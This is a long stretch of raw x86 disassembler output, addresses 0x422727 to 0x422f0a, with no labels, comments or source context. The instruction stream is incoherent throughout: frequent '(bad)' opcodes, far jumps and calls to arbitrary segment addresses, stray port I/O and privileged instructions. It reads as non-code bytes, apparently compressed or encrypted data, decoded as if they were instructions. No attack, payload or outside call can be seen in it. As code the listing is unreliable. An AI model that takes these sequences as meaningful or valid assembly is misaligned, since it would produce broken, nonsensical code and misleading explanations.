  422727:	sbb    ecx,DWORD PTR [edx+edx*2+0x1bbab12f]
  42272e:	adc    DWORD PTR [esi-0x1cf75b6d],0x76176c08
  422738:	push   ecx
  422739:	cmp    eax,0xaf895d22
  42273e:	jns    0x4226c2
  422740:	xor    al,0x0
  422742:	xor    al,0xc0
  422744:	xor    dh,BYTE PTR [ecx+0x2]
  422747:	rcr    DWORD PTR [edi+edx*1-0x3e752cf4],1
  42274e:	call   0x112d:0x74ac869
  422755:	sbb    DWORD PTR [edi+edi*1-0x3c],edi
  422759:	(bad)  
  42275a:	aas    
  42275b:	lods   al,BYTE PTR ds:[esi]
  42275c:	adc    edi,DWORD PTR [edi]
  42275e:	mov    DWORD PTR [eax],edx
  422760:	cmp    bh,BYTE PTR [eax]
  422762:	enter  0xadba,0xd5
  422766:	xor    esp,DWORD PTR [ebx-0x6e]
  422769:	jmp    0xabf5:0xb3d30c3c
  422770:	(bad)  
  422771:	jmp    0x42279a
  422773:	pop    eax
  422774:	push   ebp
  422775:	push   es
  422776:	adc    al,0x9
  422778:	mov    bh,0xa4
  42277a:	int3   
  42277b:	out    0xe6,al
  42277d:	fistp  WORD PTR [ebx+edi*2+0x2d8cbd00]
  422784:	icebp  
  422785:	sub    DWORD PTR [esi-0x62c02bbf],edi
  42278b:	and    dl,BYTE PTR [ebp+0x5a1e2147]
  422791:	dec    eax
  422792:	dec    ebp
  422793:	inc    edi
  422794:	jecxz  0x4227a9
  422796:	imul   ecx,ebx,0x7e
  422799:	aas    
  42279a:	mov    bl,0xef
  42279c:	call   0x37fecd52
  4227a1:	sbb    al,0xbe
  4227a3:	cdq    
  4227a4:	cmp    ecx,edx
  4227a6:	add    DWORD PTR [eax],0x58
  4227a9:	dec    edx
  4227aa:	ss imul ecx,ebp,0x41
  4227ae:	fidiv  WORD PTR [esi-0x6ff49c4c]
  4227b4:	or     edx,DWORD PTR [ecx]
  4227b6:	pusha  
  4227b7:	add    eax,0x6a256ca5
  4227bc:	mov    dh,0xd9
  4227be:	into   
  4227bf:	dec    eax
  4227c0:	jne    0x422814
  4227c2:	dec    esp
  4227c3:	rcl    DWORD PTR [edx],0xe2
  4227c6:	mov    eax,0x23a44f04
  4227cb:	in     eax,dx
  4227cc:	imul   esi,DWORD PTR [ecx],0x8a48029a
  4227d2:	xchg   ebx,ecx
  4227d4:	data16 jne 0x4227af
  4227d7:	lock int 0x94
  4227da:	xlat   BYTE PTR ds:[ebx]
  4227db:	mov    WORD PTR [eax+0x54f69348],gs
  4227e1:	sub    al,0x71
  4227e3:	sahf   
  4227e4:	leave  
  4227e5:	stos   BYTE PTR es:[edi],al
  4227e6:	jmp    0x6539:0x41a824c7
  4227ed:	sti    
  4227ee:	pop    edx
	...
  4227f7:	add    BYTE PTR [eax],al
  4227f9:	add    BYTE PTR [eax-0x11],cl
  4227fc:	ja     0x422869
  4227fe:	idiv   ebx
  422800:	pop    esp
  422801:	out    dx,eax
  422802:	cmp    DWORD PTR [ecx+0x39f2e210],ebx
  422808:	xchg   dh,al
  42280a:	fsub   DWORD PTR [edx+0x1fd0001]
  422810:	add    BYTE PTR [eax],al
  422812:	int    0x24
  422814:	adc    bl,BYTE PTR [ebp+ecx*4+0x2fa9bdbb]
  42281b:	pop    ebp
  42281c:	in     eax,dx
  42281d:	xchg   edx,eax
  42281e:	loop   0x4227f0
  422820:	push   edx
  422821:	test   al,0xe0
  422823:	or     eax,0xc5eaa20e
  422828:	pop    eax
  422829:	arpl   WORD PTR [ecx],dx
  42282b:	add    dh,al
  42282d:	(bad)  
  42282e:	cmp    eax,0x7ebc1f18
  422833:	sub    edx,DWORD PTR [edx+eiz*4+0x53ab80b6]
  42283a:	mov    BYTE PTR [eax],0xe1
  42283d:	cmp    eax,0xdb678197
  422842:	jmp    0x61c7:0x6355e70a
  422849:	outs   dx,DWORD PTR ds:[esi]
  42284a:	cmp    DWORD PTR [esi-0x4f135c08],eax
  422850:	xchg   ebx,eax
  422851:	mov    esp,0xff5d86f0
  422856:	clc    
  422857:	xor    al,0x78
  422859:	xchg   edi,eax
  42285a:	inc    edx
  42285b:	sub    BYTE PTR [edi],ch
  42285d:	inc    ecx
  42285e:	cs retf 
  422860:	mov    ebx,0x82cfcd6a
  422865:	mov    eax,0xfa223ab2
  42286a:	jae    0x422867
  42286c:	call   0x1d66:0x73a77d0
  422873:	adc    DWORD PTR [ecx-0x38564bc6],ebp
  422879:	xchg   ecx,eax
  42287a:	mov    ecx,0x30039111
  42287f:	mov    ch,0xe1
  422881:	loope  0x422885
  422883:	out    0x85,al
  422885:	adc    BYTE PTR [edx],cl
  422887:	fnstsw WORD PTR [edi]
  422889:	jmp    0x42285a
  42288b:	xchg   ecx,eax
  42288c:	cdq    
  42288d:	or     al,0xea
  42288f:	out    0x4a,eax
  422891:	out    0x1e,eax
  422893:	lds    ebp,FWORD PTR [edi+0x45]
  422896:	cli    
  422897:	mov    eax,fs
  422899:	dec    ebp
  42289a:	push   ebx
  42289b:	fmul   QWORD PTR [esi+0x49eed0b3]
  4228a1:	(bad)  
  4228a3:	cmc    
  4228a4:	retf   
  4228a5:	push   ecx
  4228a6:	mov    al,0x9a
  4228a8:	jecxz  0x422837
  4228aa:	jae    0x422876
  4228ac:	jmp    0x8c7a:0xca1d9b6a
  4228b3:	clc    
  4228b4:	jl     0x422869
  4228b6:	jae    0x422883
  4228b8:	and    eax,0x23818250
  4228bd:	push   es
  4228be:	mov    esi,0x60c45096
  4228c3:	xchg   ecx,eax
  4228c4:	(bad)  
  4228c6:	xchg   ecx,eax
  4228c7:	into   
  4228c8:	in     eax,0x56
  4228ca:	test   ebx,esi
  4228cc:	out    0x8c,al
  4228ce:	mov    edi,0xf3fd1483
  4228d3:	xor    edx,0x60
  4228d6:	xchg   ebx,eax
  4228d7:	or     DWORD PTR [edi-0x28],0x424d7a4f
  4228de:	xchg   ebp,eax
  4228df:	dec    ecx
  4228e0:	add    DWORD PTR [eax-0x3a562290],0xffffffd5
  4228e7:	lock adc al,0xdf
  4228ea:	mov    bl,0x5b
  4228ec:	mov    bh,0x77
  4228ee:	aam    0xc1
  4228f0:	xchg   ebp,eax
  4228f1:	mov    ah,0x4c
  4228f3:	cmp    ebx,DWORD PTR ds:0x22c68cf0
  4228f9:	repz pushf 
  4228fb:	test   BYTE PTR [eax],bl
  4228fd:	rcl    BYTE PTR [ecx-0x9],cl
  422900:	push   ss
  422901:	ja     0x4228ef
  422903:	sub    BYTE PTR [ebp-0x12],bh
  422906:	arpl   WORD PTR [esi+0x10],bx
  422909:	loopne 0x42295f
  42290b:	and    ch,al
  42290d:	(bad)  
  42290e:	push   edi
  42290f:	add    ebp,DWORD PTR [edi+ebx*1-0x4ebcd99b]
  422916:	dec    ebx
  422917:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422918:	xchg   ebx,eax
  422919:	inc    edx
  42291a:	cwde   
  42291b:	mov    eax,0xefc5d535
  422920:	sub    ebp,DWORD PTR [eax]
  422922:	sbb    edi,edi
  422924:	pop    esi
  422925:	pop    ebx
  422926:	and    al,0xc5
  422928:	int    0x1
  42292a:	sbb    al,0xe7
  42292c:	test   al,0xa
  42292e:	xchg   esp,eax
  42292f:	jp     0x42291f
  422931:	(bad)  
  422932:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422933:	inc    ebx
  422934:	dec    eax
  422935:	ret    0xffec
  422938:	sub    bl,BYTE PTR [esi+0x32fea07d]
  42293e:	(bad)  
  422941:	dec    BYTE PTR [eax+eax*1-0x3e]
  422945:	mov    ecx,0x6396c24b
  42294a:	jmp    0x3b3e:0x39750f4e
  422951:	shl    BYTE PTR [esi],0xa8
  422954:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422955:	ins    DWORD PTR es:[edi],dx
  422956:	inc    eax
  422957:	lahf   
  422958:	stos   BYTE PTR es:[edi],al
  422959:	cli    
  42295a:	push   ss
  42295b:	jle    0x42294c
  42295d:	adc    ebx,edi
  42295f:	cmp    eax,0x6ca042bb
  422964:	fistp  DWORD PTR [esi]
  422966:	adc    BYTE PTR [esi+0x55],0xff
  42296a:	or     al,0x61
  42296c:	adc    eax,0xdf3c8a4c
  422971:	call   0x23be:0x5ec2a6bd
  422978:	addr16 imul edx,esi,0x855de435
  42297f:	sub    BYTE PTR [edx+esi*1+0x40],0xb5
  422984:	cdq    
  422985:	dec    ebp
  422986:	fs add al,0x82
  422989:	push   ds
  42298a:	jecxz  0x422938
  42298c:	loope  0x42298d
  42298e:	sbb    eax,0x2b2a1c65
  422993:	pop    ds
  422994:	sbb    bl,BYTE PTR [edi]
  422996:	cmp    BYTE PTR [edi-0x52],bh
  422999:	fisttp DWORD PTR fs:[ebx-0x2fbf51e8]
  4229a0:	mov    esp,ss
  4229a2:	xchg   esi,eax
  4229a3:	sbb    BYTE PTR [ecx-0x21e3b8e1],bh
  4229a9:	xor    edi,DWORD PTR [eax]
  4229ab:	push   esp
  4229ac:	add    bh,BYTE PTR [ebx]
  4229ae:	cld    
  4229af:	sub    ebx,DWORD PTR [edx-0x7b]
  4229b2:	add    BYTE PTR [edi-0x5e65a7f1],0x2d
  4229b9:	aas    
  4229ba:	inc    ecx
  4229bb:	pop    ss
  4229bc:	xchg   edx,eax
  4229bd:	add    al,0x4d
  4229bf:	push   ds
  4229c0:	or     DWORD PTR [ebx+0x7aaf603],edx
  4229c6:	pop    edx
  4229c7:	push   esi
  4229c8:	sub    ebp,DWORD PTR [edi+0x61863c54]
  4229ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229cf:	imul   edx,ebx,0x6b92da9d
  4229d5:	and    eax,0xb212bfd
  4229da:	push   eax
  4229db:	ins    DWORD PTR es:[edi],dx
  4229dc:	jmp    0x422a55
  4229de:	pushaw 
  4229e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229e1:	mov    edx,edx
  4229e3:	push   ss
  4229e4:	and    eax,0xb9bdfdc7
  4229e9:	leave  
  4229ea:	sbb    eax,0x68b59bd1
  4229ef:	mov    bh,0x91
  4229f1:	add    bl,BYTE PTR ds:0x4ee0e9fe
  4229f7:	(bad)  
  4229f8:	cmp    al,0x50
  4229fa:	inc    edx
  4229fb:	loop   0x422a4f
  4229fd:	sbb    BYTE PTR ds:0x433956f9,dl
  422a03:	aas    
  422a04:	bound  edx,QWORD PTR [esi]
  422a06:	stos   BYTE PTR es:[edi],al
  422a07:	pop    ebp
  422a08:	adc    al,0x28
  422a0a:	call   0x0:0x91eedd2b
	...
  422a19:	add    BYTE PTR [eax+0x5be35ae3],dh
  422a1f:	sti    
  422a20:	mov    ecx,0xeb2b3af3
  422a25:	inc    ecx
  422a26:	xchg   esi,eax
  422a27:	sbb    ecx,esp
  422a29:	icebp  
  422a2a:	aad    0xa4
  422a2c:	add    DWORD PTR [eax],eax
  422a2e:	std    
  422a2f:	add    DWORD PTR [eax],eax
  422a31:	add    BYTE PTR [edx+0x34f8eafd],dl
  422a37:	in     eax,dx
  422a38:	jae    0x4229df
  422a3a:	neg    ebp
  422a3c:	int    0x55
  422a3e:	add    edi,DWORD PTR [edx-0x29]
  422a41:	dec    edx
  422a42:	arpl   WORD PTR [ebp-0x12],sp
  422a45:	addr16 sbb bl,ah
  422a48:	retf   
  422a49:	test   DWORD PTR [edx-0x57],edx
  422a4c:	mov    edx,DWORD PTR [ecx]
  422a4e:	in     al,0xec
  422a50:	std    
  422a51:	jo     0x4229dc
  422a53:	fldlg2 
  422a55:	pushf  
  422a56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a57:	pop    esp
  422a58:	or     DWORD PTR fs:[ebp+0x3c95c16f],0x7b
  422a60:	and    ebp,edi
  422a62:	mov    dh,0xb9
  422a64:	popa   
  422a65:	cdq    
  422a66:	xchg   ebx,esi
  422a68:	inc    ecx
  422a69:	pop    ecx
  422a6a:	js     0x422a1d
  422a6c:	jmp    FWORD PTR [ebp+0x60b55d91]
  422a72:	cmp    ch,BYTE PTR [ecx]
  422a74:	jp     0x422a78
  422a76:	ja     0x422a80
  422a78:	lds    edi,FWORD PTR [ecx-0x63d035ca]
  422a7e:	in     eax,dx
  422a7f:	pop    ebp
  422a80:	mov    BYTE PTR [eax+0x2764a43b],dh
  422a86:	fstp   st(1)
  422a88:	or     BYTE PTR [edx-0x542ba379],0xc8
  422a8f:	mov    edx,0x406f955b
  422a94:	xor    BYTE PTR [ecx],ch
  422a96:	into   
  422a97:	mov    WORD PTR [ebx-0x6],es
  422a9a:	(bad)  
  422a9b:	aad    0x1b
  422a9d:	or     edi,DWORD PTR [edi+0x1abc826b]
  422aa3:	adc    cl,dl
  422aa5:	mov    ds:0x3108615c,eax
  422aaa:	pop    ebp
  422aab:	pop    es
  422aac:	pop    ds
  422aad:	stos   DWORD PTR es:[edi],eax
  422aae:	scas   al,BYTE PTR es:[edi]
  422aaf:	shr    BYTE PTR ds:0xc87c,cl
  422ab4:	mov    eax,?
  422ab6:	retf   
  422ab7:	pop    ecx
  422ab8:	push   0xc193ad5b
  422abd:	aas    
  422abe:	dec    BYTE PTR [eax-0x18ba135d]
  422ac4:	popa   
  422ac5:	(bad)  
  422ac7:	les    esp,FWORD PTR [eax-0x13]
  422aca:	mov    cl,0x96
  422acc:	ret    0xbd56
  422acf:	icebp  
  422ad0:	pop    ss
  422ad1:	pop    esp
  422ad2:	add    BYTE PTR [esp+edi*4+0x1e29a5d1],cl
  422ad9:	js     0x422a9a
  422adb:	mov    ds:0xea0af07e,eax
  422ae0:	inc    eax
  422ae1:	cld    
  422ae2:	add    eax,0x797fc2e5
  422ae7:	(bad)  
  422ae8:	ds ret 0x5cfc
  422aec:	fnstsw WORD PTR [edi-0x795656e3]
  422af2:	cmp    DWORD PTR [edx],esi
  422af4:	xor    BYTE PTR ds:0xe7529c45,dh
  422afa:	xor    ebx,DWORD PTR [edi]
  422afc:	or     ebp,DWORD PTR [edx-0x1513cb07]
  422b02:	push   eax
  422b03:	pop    edx
  422b04:	call   DWORD PTR [esi]
  422b06:	loope  0x422b2b
  422b08:	in     eax,0xfd
  422b0a:	cdq    
  422b0b:	ret    
  422b0c:	pushf  
  422b0d:	mov    dl,0x4d
  422b0f:	cmp    eax,0x6f809df5
  422b14:	dec    esi
  422b15:	addr16 fmul st,st(1)
  422b18:	aad    0xdb
  422b1a:	dec    ebx
  422b1b:	or     DWORD PTR [ebp+0x1e],eax
  422b1e:	test   ebx,ebp
  422b20:	aad    0x8c
  422b22:	js     0x422b35
  422b24:	cs xchg edi,eax
  422b26:	(bad)  
  422b27:	iret   
  422b28:	int    0x45
  422b2a:	mov    al,ds:0xb6c28369
  422b2f:	adc    dh,BYTE PTR [edx+eiz*2-0x32c22a87]
  422b36:	and    al,0x73
  422b38:	jbe    0x422b90
  422b3a:	mov    ecx,0xf1e3b0ba
  422b3f:	into   
  422b40:	cli    
  422b41:	icebp  
  422b42:	stos   BYTE PTR es:[edi],al
  422b43:	mov    edi,0x145145f0
  422b48:	hlt    
  422b49:	pop    ds
  422b4a:	in     eax,0xc5
  422b4c:	inc    ecx
  422b4d:	mov    ebx,0x9cff5ea
  422b52:	or     DWORD PTR [eax-0x19],ebx
  422b55:	lods   eax,DWORD PTR ds:[esi]
  422b56:	sub    al,0x34
  422b58:	pop    ebp
  422b59:	jle    0x422bbb
  422b5b:	aad    0xda
  422b5d:	inc    eax
  422b5e:	adc    eax,0x88a8bd0e
  422b63:	jge    0x422b38
  422b65:	loope  0x422ba6
  422b67:	pop    esi
  422b68:	mov    esp,0xb959083d
  422b6d:	fiadd  DWORD PTR [ebx+ebp*4+0x32]
  422b71:	jae    0x422afa
  422b73:	ror    DWORD PTR [eax+0x888a2e9],1
  422b79:	jne    0x422b2b
  422b7b:	xchg   ecx,eax
  422b7c:	jg     0x422bdf
  422b7e:	enter  0xcaca,0x19
  422b82:	ja     0x422bb2
  422b84:	arpl   WORD PTR [ebp+0x10],sp
  422b87:	stos   DWORD PTR es:[edi],eax
  422b88:	shl    edx,0xc8
  422b8b:	pop    eax
  422b8c:	fs inc ebx
  422b8e:	loop   0x422b46
  422b90:	sub    eax,0xb4719793
  422b95:	mov    ch,0x8f
  422b97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b98:	rcr    DWORD PTR [eax+ebp*8],1
  422b9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b9c:	jns    0x422b53
  422b9e:	mov    ch,0xa8
  422ba0:	dec    eax
  422ba1:	ds cmp eax,0xa0c68941
  422ba7:	lods   eax,DWORD PTR ds:[esi]
  422ba8:	(bad)  
  422baa:	repnz mov WORD PTR [esp+ebp*2],ds
  422bae:	sub    DWORD PTR [ebx-0x41b28e78],eax
  422bb4:	cwde   
  422bb5:	push   esi
  422bb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422bb7:	add    ah,ch
  422bb9:	outs   dx,DWORD PTR ds:[esi]
  422bba:	jmp    0x45387508
  422bbf:	or     ah,BYTE PTR [ebx+ebx*8]
  422bc2:	pop    ecx
  422bc3:	or     dl,BYTE PTR [ebx-0x649e38b8]
  422bc9:	jmp    0xe73e:0x2ed70436
  422bd0:	iret   
  422bd1:	out    dx,al
  422bd2:	repz (bad) 
  422bd5:	sbb    BYTE PTR [esi+ecx*4+0x3cad4fb2],ch
  422bdc:	outs   dx,BYTE PTR ds:[esi]
  422bdd:	jecxz  0x422b61
  422bdf:	adc    ebx,eax
  422be1:	xlat   BYTE PTR ds:[ebx]
  422be2:	inc    ecx
  422be3:	mov    eax,ds:0x9b462aa4
  422be8:	lahf   
  422be9:	mov    ds:0xedf60259,al
  422bee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422bef:	int3   
  422bf0:	push   esi
  422bf1:	mov    ah,ch
  422bf3:	lahf   
  422bf4:	cld    
  422bf5:	mov    ch,BYTE PTR [ebx+0x74]
  422bf8:	and    ebp,DWORD PTR [edx+0xf]
  422bfb:	daa    
  422bfc:	dec    ebx
  422bfd:	out    0x7,al
  422bff:	out    0x0,al
  422c01:	in     eax,0x5e
  422c03:	sub    al,0x64
  422c05:	ret    0xe6aa
  422c08:	adc    bh,BYTE PTR [eax]
  422c0a:	scas   eax,DWORD PTR es:[edi]
  422c0b:	mov    dl,0x94
  422c0d:	mov    esi,0xa71923ea
  422c12:	sbb    ah,BYTE PTR [edi]
  422c14:	lock retf 0x175a
  422c18:	push   ecx
  422c19:	mov    ds:0xe230e989,eax
  422c1e:	into   
  422c1f:	jo     0x422c06
  422c21:	mov    WORD PTR [esp+edi*1-0x206a5896],ds
  422c28:	push   esi
  422c29:	pop    edx
  422c2a:	mov    ebp,DWORD PTR [edx+0x43]
  422c2d:	or     cl,BYTE PTR [eax]
	...
  422c37:	add    BYTE PTR [eax],al
  422c39:	add    BYTE PTR ds:0xbf06168e,dh
  422c3f:	sahf   
  422c40:	xor    eax,0x913f27bf
  422c45:	sub    ecx,DWORD PTR [ebx+esi*2]
  422c48:	mov    bh,0x9f
  422c4a:	shl    BYTE PTR [esi+0x1fd0001],cl
  422c50:	add    BYTE PTR [eax],al
  422c52:	cmp    dl,BYTE PTR [ecx-0x648a352a]
  422c58:	jge    0x422c02
  422c5a:	dec    BYTE PTR [ebp-0x42]
  422c5d:	enter  0x9dff,0xce
  422c61:	cmc    
  422c62:	adc    al,0x5a
  422c64:	jns    0x422c9f
  422c66:	ss leave 
  422c68:	push   0x53489c4d
  422c6d:	lods   eax,DWORD PTR ds:[esi]
  422c6e:	or     eax,0x731ceec4
  422c73:	mov    esp,0xd87fd02a
  422c78:	in     eax,0x46
  422c7a:	neg    BYTE PTR [ebp+0x2b6182d3]
  422c80:	inc    esp
  422c81:	dec    ebx
  422c82:	arpl   WORD PTR [ebx+0x2358e6a2],di
  422c88:	cmc    
  422c89:	leave  
  422c8a:	xor    DWORD PTR [edi+eiz*2-0x1f],0xeabcc92
  422c92:	fmul   DWORD PTR [ebp-0x2a0e30b7]
  422c98:	dec    ebp
  422c99:	call   0x9aa2b458
  422c9e:	pop    eax
  422c9f:	lahf   
  422ca0:	jo     0x422c51
  422ca2:	xchg   esp,eax
  422ca3:	pop    eax
  422ca4:	mov    dl,0xa4
  422ca6:	mov    ah,0xfc
  422ca8:	in     eax,dx
  422ca9:	cmp    eax,DWORD PTR [esi+0x45]
  422cac:	ret    
  422cad:	pop    esp
  422cae:	add    bh,BYTE PTR [edi+ecx*2]
  422cb1:	loop   0x422c45
  422cb3:	sbb    bh,bl
  422cb5:	and    eax,0xcedee66e
  422cba:	fsubr  st,st(1)
  422cbc:	out    0xd7,eax
  422cbe:	int3   
  422cbf:	jle    0x422d25
  422cc1:	lods   al,BYTE PTR ds:[esi]
  422cc2:	aam    0x47
  422cc4:	repz pusha 
  422cc6:	rcr    cl,1
  422cc8:	mov    WORD PTR [edx],?
  422cca:	nop
  422ccb:	cmc    
  422ccc:	sub    eax,0xd92229c9
  422cd1:	fsub   DWORD PTR [edi+edx*1]
  422cd4:	test   eax,0x56230e0e
  422cd9:	sbb    al,0x9
  422cdb:	sahf   
  422cdc:	mov    ebx,0x63029a5
  422ce1:	adc    al,BYTE PTR [eax+edx*2]
  422ce4:	cwde   
  422ce5:	add    al,0x7a
  422ce7:	stos   BYTE PTR es:[edi],al
  422ce8:	push   esp
  422ce9:	pop    esi
  422cea:	repz test eax,0x4ad724a5
  422cf0:	and    BYTE PTR [edi-0x22],al
  422cf3:	xchg   ecx,eax
  422cf4:	stos   DWORD PTR es:[edi],eax
  422cf5:	xchg   DWORD PTR [edi+0x7b],eax
  422cf8:	in     eax,0x28
  422cfa:	sti    
  422cfb:	push   edx
  422cfc:	push   esp
  422cfd:	xchg   ecx,eax
  422cfe:	mov    cl,0xb2
  422d00:	jb     0x422cfe
  422d02:	adc    al,0x1
  422d04:	mov    esp,0x27f89426
  422d09:	pop    esi
  422d0a:	jg     0x422d20
  422d0c:	pushf  
  422d0d:	push   0x2986f419
  422d12:	(bad)  
  422d13:	sbb    eax,0xe7fd5601
  422d18:	loop   0x422cfd
  422d1a:	je     0x422c9f
  422d1c:	pop    edx
  422d1d:	sub    edx,DWORD PTR [esi+0x13]
  422d20:	sub    esp,DWORD PTR [ebx+0x5d]
  422d23:	pop    ebx
  422d24:	jo     0x422cbe
  422d26:	mov    fs:0xd76b153e,al
  422d2c:	jmp    0x67ef80fa
  422d31:	iret   
  422d32:	add    dl,BYTE PTR [ebx+ecx*1+0x5c157560]
  422d39:	push   cs
  422d3a:	imul   esp,DWORD PTR [ebp+0x42],0xccfde329
  422d41:	mov    ecx,0xdf8f6c82
  422d46:	lods   eax,DWORD PTR ds:[esi]
  422d47:	sbb    ebp,DWORD PTR [ebx+0x7b]
  422d4a:	repnz mov ebx,0x3b20a7eb
  422d50:	(bad)  
  422d51:	xlat   BYTE PTR ds:[ebx]
  422d52:	jge    0x422cd7
  422d54:	jae    0x422db9
  422d56:	lds    esi,FWORD PTR [eax-0x69152f2f]
  422d5c:	in     al,0x4a
  422d5e:	shr    BYTE PTR [ebx],1
  422d60:	cld    
  422d61:	cmp    DWORD PTR [edx+ecx*1+0x29],ebx
  422d65:	pop    ds
  422d66:	mov    cl,0xbe
  422d68:	xchg   edi,eax
  422d69:	mov    ebp,0xa62ae740
  422d6e:	dec    ebx
  422d6f:	add    al,0x96
  422d71:	lea    ebp,[ebp-0x2f]
  422d74:	jbe    0x422dcb
  422d76:	(bad)  
  422d77:	lods   eax,DWORD PTR ds:[esi]
  422d78:	cmp    BYTE PTR [ebx],dh
  422d7a:	out    dx,eax
  422d7b:	shl    BYTE PTR [edx-0x640da5cf],1
  422d81:	clc    
  422d82:	test   al,0xc2
  422d84:	ja     0x422e03
  422d86:	pop    esi
  422d87:	and    ecx,esp
  422d89:	call   0xbe38f83c
  422d8e:	mov    edi,DWORD PTR [esi+eax*8]
  422d91:	mov    WORD PTR [edx+0x50],?
  422d94:	mov    eax,ds:0x10986861
  422d99:	lods   al,BYTE PTR ds:[esi]
  422d9a:	adc    ebx,DWORD PTR [ebp+edx*4+0x4c]
  422d9e:	cmc    
  422d9f:	loop   0x422d35
  422da1:	lahf   
  422da2:	out    dx,al
  422da3:	pop    esp
  422da4:	mov    ah,0x44
  422da6:	jns    0x422ddd
  422da8:	inc    ebp
  422da9:	pop    ds
  422daa:	or     ah,BYTE PTR [edx+0x6515fe1d]
  422db0:	add    ecx,DWORD PTR [ebx-0x69c4887a]
  422db6:	test   BYTE PTR [edi+0x1e],bh
  422db9:	je     0x422d76
  422dbb:	dec    esi
  422dbc:	leave  
  422dbd:	jbe    0x422d3f
  422dbf:	sub    DWORD PTR ds:0xaa533275,ebp
  422dc5:	inc    esi
  422dc6:	leave  
  422dc7:	fisttp DWORD PTR [ebx-0x54062021]
  422dcd:	js     0x422e09
  422dcf:	mov    esi,0xf7ef2683
  422dd4:	jno    0x422dfd
  422dd6:	in     eax,dx
  422dd7:	jno    0x422da8
  422dd9:	pop    ecx
  422dda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ddb:	stos   BYTE PTR es:[edi],al
  422ddc:	mov    cl,0x6c
  422dde:	push   es
  422ddf:	ror    BYTE PTR [edx+edx*4],0x45
  422de3:	out    0xe7,al
  422de5:	aas    
  422de6:	les    edx,FWORD PTR [esi]
  422de8:	loopne 0x422ded
  422dea:	loopne 0x422d8f
  422dec:	jge    0x422de0
  422dee:	bound  edx,QWORD PTR [ecx+0x5dcdaaab]
  422df4:	(bad)  
  422df5:	jmp    0x8ca:0xbd217b18
  422dfc:	xchg   DWORD PTR [edi+esi*2-0x6c],edi
  422e00:	je     0x422e4e
  422e02:	cdq    
  422e03:	test   al,ch
  422e05:	or     edx,DWORD PTR [edx+0x2c]
  422e08:	jle    0x422e37
  422e0a:	xor    BYTE PTR [edi-0x64],bl
  422e0d:	out    0x5d,eax
  422e0f:	mov    WORD PTR [eax-0x5b4a12b4],gs
  422e15:	ds pushf 
  422e17:	mov    edx,DWORD PTR [edi+0x754bd787]
  422e1d:	inc    ebp
  422e1e:	jae    0x422e28
  422e20:	lods   eax,DWORD PTR ds:[esi]
  422e21:	and    al,0xb7
  422e23:	das    
  422e24:	(bad)  
  422e25:	pop    ebp
  422e26:	inc    edi
  422e27:	inc    edi
  422e28:	mov    ch,0xe1
  422e2a:	cdq    
  422e2b:	push   edx
  422e2c:	lock daa 
  422e2e:	mov    dh,0x71
  422e30:	adc    al,0x5a
  422e32:	xor    ecx,DWORD PTR [ebx-0x7e]
  422e35:	pusha  
  422e36:	dec    esp
  422e37:	push   0x20
  422e39:	stos   BYTE PTR es:[edi],al
  422e3a:	in     al,0xf4
  422e3c:	loopne 0x422dd0
  422e3e:	xchg   ebp,eax
  422e3f:	or     eax,0x51883ac5
  422e44:	mov    WORD PTR ds:[edx-0x7f],gs
  422e48:	out    dx,eax
  422e49:	test   BYTE PTR [edx+0x40a1eab7],bh
	...
  422e57:	add    BYTE PTR [eax],al
  422e59:	add    cl,bh
  422e5b:	std    
  422e5c:	in     eax,dx
  422e5d:	mov    cl,0xed
  422e5f:	mov    cl,0xfd
  422e61:	std    
  422e62:	cmp    bl,BYTE PTR [edi-0x84a013c]
  422e68:	cli    
  422e69:	xor    bh,cl
  422e6b:	test   al,0x1
  422e6d:	add    ch,bh
  422e6f:	add    DWORD PTR [eax],eax
  422e71:	add    bl,dl
  422e73:	sbb    bl,0x36
  422e76:	daa    
  422e77:	mov    bl,0x22
  422e79:	enter  0x7aa9,0x20
  422e7d:	inc    edx
  422e7e:	adc    ch,BYTE PTR [esi]
  422e80:	pusha  
  422e81:	enter  0x4855,0x8d
  422e85:	stos   BYTE PTR es:[edi],al
  422e86:	or     eax,0x7cf4a5ac
  422e8b:	cmovns esp,DWORD PTR [edx+0x1cce6232]
  422e92:	and    DWORD PTR [ebx-0x59d5c759],ebx
  422e98:	xor    ecx,DWORD PTR [edx-0x74]
  422e9b:	jno    0x422ee8
  422e9d:	mov    al,0xda
  422e9f:	cmp    ebp,DWORD PTR [esi]
  422ea1:	dec    edi
  422ea2:	inc    edi
  422ea3:	push   eax
  422ea4:	lods   eax,DWORD PTR ds:[esi]
  422ea5:	and    DWORD PTR [ebx+0x76],edx
  422ea8:	xchg   edx,eax
  422ea9:	jg     0x422efe
  422eab:	cmp    bh,BYTE PTR [ebp+0x65]
  422eae:	xchg   DWORD PTR [ebx],esp
  422eb0:	jns    0x422f25
  422eb2:	sub    dl,bl
  422eb4:	shl    BYTE PTR [eax+ecx*2],0x97
  422eb8:	je     0x422e3b
  422eba:	sub    eax,0x2a8cdede
  422ebf:	rol    BYTE PTR [edx-0x327e2686],cl
  422ec5:	jmp    0x6503466f
  422eca:	xor    dl,al
  422ecc:	push   ss
  422ecd:	xor    ebp,edi
  422ecf:	lods   al,BYTE PTR ds:[esi]
  422ed0:	mov    edx,0x2376d573
  422ed5:	fcomp  QWORD PTR [eax+edi*4-0x2597b49f]
  422edc:	int    0xf3
  422ede:	fldcw  WORD PTR [ecx]
  422ee0:	sbb    al,0x1b
  422ee2:	outs   dx,BYTE PTR ds:[esi]
  422ee3:	fcmovnbe st,st(7)
  422ee5:	dec    edi
  422ee6:	xchg   BYTE PTR [edx+ebp*1],ah
  422ee9:	aaa    
  422eea:	imul   edi,DWORD PTR [esi+0x7b],0xe15b8915
  422ef1:	xchg   ecx,eax
  422ef2:	adc    eax,0xa962d010
  422ef7:	das    
  422ef8:	leave  
  422ef9:	iret   
  422efa:	jae    0x422e81
  422efc:	imul   ebp,DWORD PTR [eax+ebp*8+0x6276e6ed],0x50
  422f04:	push   cs
  422f05:	push   esp
  422f06:	movlhps xmm3,xmm3
  422f09:	into   
  422f0a:	popf   
